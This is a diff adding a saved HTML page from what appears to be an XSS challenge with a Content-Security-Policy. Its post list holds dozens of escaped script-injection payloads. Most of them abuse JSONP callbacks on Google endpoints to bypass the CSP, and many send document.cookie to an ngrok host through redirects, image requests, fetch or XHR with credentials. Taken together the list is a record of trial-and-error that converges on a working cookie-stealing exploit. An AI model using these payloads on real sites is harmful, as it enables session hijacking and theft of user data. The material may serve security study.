@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+    <meta char="utf-8">
+    <title>Hello</title>
+
+    <head>
+    </head>
+        
+    <body>
+        
+<div>CSP: <p><code>default-src &#39;self&#39;; script-src &#39;self&#39; *.google.com; connect-src *</code></div>
+<hr>
+
+<div class="submission">
+    <form method="POST" action="/">
+        <input type="text" name="content" placeholder="Say something cool"><br><br>
+        <input type="submit" value="Submit">
+    </form>
+</div>
+
+<div>
+
+<hr>
+
+Your posts:
+
+<ul>
+
+
+<li><a href="/post?id=36815">Cool</a></li>
+
+<li><a href="/post?id=36834">&lt;script&gt;alert(0);&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=38307">jjhghjghj</a></li>
+
+<li><a href="/post?id=38367">default-src &#39;self&#39;; script-src &#39;self&#39; *.google.com; connect-src *</a></li>
+
+<li><a href="/post?id=38373">&lt;script&gt;alert(0);//{&#34;name&#34;:&#34;Marton&#34;}&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=38682">&lt;script src=”http://example.com/jsonp?callback=alert(1);//”&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=38717">&lt;script&gt;alert(0);&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=38718">ggg</a></li>
+
+<li><a href="/post?id=38798">&lt;img src=&#34;https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png&#34; onerror=&#34;this.src=alert(1)&#34;/&gt;</a></li>
+
+<li><a href="/post?id=39257">&lt;script type=&#34;text/javascript&#34;&gt; document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie; &lt;/script&gt;</a></li>
+
+<li><a href="/post?id=39315">&lt;a href=&#34;#&#34; onclick=&#34;document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie;&#34;&gt;test&lt;/a&gt;</a></li>
+
+<li><a href="/post?id=39335">&lt;a href=&#34;#&#34; onclick=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;&gt;test&lt;/a&gt;</a></li>
+
+<li><a href="/post?id=39363">&lt;script&gt; function myFunction() {   document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie; } &lt;/script&gt;</a></li>
+
+<li><a href="/post?id=39366">&lt;p id=&#34;demo&#34; onclick=&#34;myFunction()&#34;&gt;Click me to change my text color.&lt;/p&gt;  &lt;script&gt; function myFunction() {   document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie; } &lt;/script&gt;</a></li>
+
+<li><a href="/post?id=39372">&lt;a href=&#34;#&#34; onclick=&#34;alert(&#39;This will be allowed&#39;)&#34;&gt;test&lt;/a&gt;</a></li>
+
+<li><a href="/post?id=39505">&#34;&gt;&#39;&gt;&lt;script src=&#34;https://compass-security.com/jsonp?callback=alert(1);u&#34;&gt;</a></li>
+
+<li><a href="/post?id=39508">&lt;script src=&#34;https://compass-security.com/jsonp?callback=alert(1);u&#34;&gt;</a></li>
+
+<li><a href="/post?id=39515">&lt;script src=&#34;https://google.com/jsonp?callback=alert(1);u&#34;&gt;</a></li>
+
+<li><a href="/post?id=40021">&#34;&gt;&lt;script+src=&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert()”&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40125">&#34;&gt;&lt;script+src=&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert()”&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40133">&lt;script&gt;src=&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert()”&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40428">&#34;&gt;&lt;script+src=&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)&#34;&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40441">&lt;script+src=&#34;https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)&#34;&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40449">&#34;&gt;&lt;script+src=&#34;https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)&#34;&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40468">&#34;&gt;&lt;script src=&#34;https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)&#34;&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40483">&lt;script src=&#34;https://accounts.google.com/o/oauth2/revoke?callback=document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie;&#34;&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=40508">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</a></li>
+
+<li><a href="/post?id=40509">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</a></li>
+
+<li><a href="/post?id=40517">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert()&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40557">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location(&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie;&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40573">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40581">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40596">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40599">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40604">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(DOCUMENT.COOKIE)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40617">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(&#34;Welcome Again&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=40619">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=alert(\&#34;Hi\&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47030">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=http://ae4a6c1a.ngrok.io/&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47035">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=http://ae4a6c1a.ngrok.io/&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47037">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=&#34;http://ae4a6c1a.ngrok.io/&#34;&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47041">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location(&#34;http://ae4a6c1a.ngrok.io/&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47044">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=http://ae4a6c1a.ngrok.io/&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47048">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=&#34;http://ae4a6c1a.ngrok.io/&#34;&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47085">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=&#34;ae4a6c1a.ngrok.io&#34;&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47121">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://www.w3schools.com&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47123">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47143">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;+document.cookie)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47167">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47175">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47186">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47190">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47191">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47339">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img src=&#34;http://ae4a6c1a.ngrok.io/?c=&#39; + document.cookie + &#39;&#34; /&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47352">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img src=x onerror=this.src=&#34;http://ae4a6c1a.ngrok.io/?c=&#34;+document.cookie&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47357">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img src=x onerror=this.src=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47375">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img src=&#34;http://ae4a6c1a.ngrok.io/?c=&#39; + document.cookie + &#39;&#34; /&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47398">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img src=&#34;http://ae4a6c1a.ngrok.io/?c=&#34; /&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47411">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io/?c=&#34; /&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47415">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io/?c=&#34;+/&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47418">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#34;+/&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47423">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#34;+&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47428">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#34;+\/&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47430">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#34;&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47434">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#34;/&gt;&#39;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47440">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#39;&#34;+&#34;/&gt;&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47447">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.write(&#39;&lt;img+src=&#34;http://ae4a6c1a.ngrok.io?c=&#39;&#34;+ document.cookie +&#34;/&gt;&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47457">&lt;script&gt;document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=47468">&lt;script src=https://accounts.google.com/o/oauth2/revoke?callback=document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&gt;&lt;/script&gt;</a></li>
+
+<li><a href="/post?id=47476">* &lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=&lt;script&gt;document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&lt;/script&gt;&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47483">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=&lt;script&gt;document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&lt;/script&gt;&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=47487">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=document.location=&#39;http://ae4a6c1a.ngrok.io/?c=&#39;+document.cookie&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50114">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=onfetch=function(e){e.fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;)};&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50132">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function(e){e.fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;)};&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50135">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function fetch(e){e.fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;)};&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50157">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;).then(res=&gt;{console.log(res)})&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50165">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;).then(res=&gt;{console.log(res)}) &gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50169">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50174">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;+document.cookie)&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50178">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50194">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io&#34;,{credentials:&#39;include&#39;})&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50233">s</a></li>
+
+<li><a href="/post?id=50417">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(get_posts()))&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50491">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function(){var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://ae4a6c1a.ngrok.io&#39;, true);xhr.withCredentials = true;xhr.send(null); })&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50500">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=function hi(){var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://ae4a6c1a.ngrok.io&#39;, true);xhr.withCredentials = true;xhr.send(null); })&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50519">&lt;SCRIPT SRC=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=function hi(){var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://ae4a6c1a.ngrok.io&#39;, true);xhr.withCredentials = true;xhr.send(null); })&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=50528">&lt;SCRIPT SRC=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=function hi(){var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://ae4a6c1a.ngrok.io&#39;, true);xhr.withCredentials = true;xhr.send(null); })&gt;&lt;/SCRIPT&gt;</a></li>
+
+<li><a href="/post?id=51809">&lt;SCRIPT SRC=https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#34;http://ae4a6c1a.ngrok.io/?c=&#34;.concat(document.cookie),{credentials:&#39;include&#39;})&gt;&lt;/SCRIPT&gt;</a></li>
+
+
+</ul>
+</div>
+
+
+    </body>
+    <script>
+        
+    </script>
+</html>
